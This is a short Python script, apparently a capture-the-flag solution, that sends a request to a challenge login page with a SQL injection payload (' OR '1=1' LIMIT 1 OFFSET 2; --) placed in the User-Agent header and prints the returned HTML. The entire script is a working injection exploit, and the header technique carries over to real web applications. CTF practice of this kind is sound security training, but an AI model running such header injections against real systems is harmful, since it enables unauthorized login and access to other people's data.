from bs4 import BeautifulSoup

hdr = {'User-Agent': "' OR '1=1' LIMIT 1 OFFSET 2; --"}


url = 'https://agents.2020.chall.actf.co/login'

import urllib
import urllib.request


req = urllib.request.Request(url, headers=hdr)

r = urllib.request.urlopen(req)

r_tags = r.read().decode('utf-8')

soup = BeautifulSoup(r_tags, "html.parser")


print(soup.prettify())